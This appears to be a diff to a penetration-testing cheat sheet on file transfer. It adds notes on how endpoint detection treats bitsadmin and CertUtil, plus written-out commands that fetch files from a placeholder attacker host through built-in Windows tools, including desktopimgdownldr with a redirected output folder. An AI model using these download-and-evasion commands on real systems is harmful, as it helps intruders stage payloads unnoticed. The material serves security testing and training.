@@ -202,7 +202,7 @@ The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
 `certutil` can be used to easily transfer files on Linux / Windows systems.   
 
 Encode the file to be transferred using base64 server-side, copy it to the
-clipboard buffer, and decode it into a file client-side.   
+clipboard buffer, and decode it into a file client-side.
 
 ```
 # Server-side (Linux)
@@ -387,6 +387,9 @@ create, download or upload files using `BITS`. Note that `BITSAdmin` will not
 attempt the download if the security context under which its executed does not
 have the permission to write files on the specified output path.
 
+Due to its possible legitimate usage, download of files through `bitsadmin` may
+not be identified as malicious by `Endpoint Detection and Response` products.
+
 ```
 # Download the remote file.
 bitsadmin /transfer <job | JOB_NAME> http://<IP | HOSTNAME>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
@@ -435,12 +438,31 @@ Start-BitsTransfer -Source "<DRIVE_NAME | DRIVE_LETTER>:\<FILE | *>" -Destinatio
 
 ###### [Windows] CertUtil
 
-`CertUtil` is a Windows command-line tool designed to manage Certification
-Authority (CA) and certificates. One of its feature is the ability to download
-files from a remote URL.
+`CertUtil` is a Windows command-line tool designed to manage `Certification
+Authority (CA)` and certificates. One of its feature is the ability to download
+files from a remote webserver by specifying an `URL`.
+
+Note that the usage of `CertUtil` is monitored by most `Endpoint Detection and
+Response` products and downloads through `CertUtil` may generate detection
+alerts.  
 
 ```
 certutil -urlcache -split -f http://<IP>:<PORT>/<FILE> <FILENAME>
+```
+
+###### [Windows] desktopimgdownldr.exe
+
+`desktopimgdownldr` is a Windows built-in utility, initially designed to set
+desktop or background screen, that can be used to download arbitrary files from
+a web server.
+
+The `SYSTEMROOT` environment variable is used by `desktopimgdownldr` to
+determine the output folder and can thus be used to specify an arbitrary output
+folder.
+
+```
+# Files will be downloaded as "LockScreenImage_<RANDOM>.ext" to "<OUTPUT_FOLDER>\Personalization\LockScreenImage\LockScreenImage\"
+set "SYSTEMROOT=<C:\Windows\Temp | OUTPUT_FOLDER>" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://<IP>:<PORT>/<FILE> /eventName:desktopimgdownldr
 ```
 
 ###### [Windows] findstr
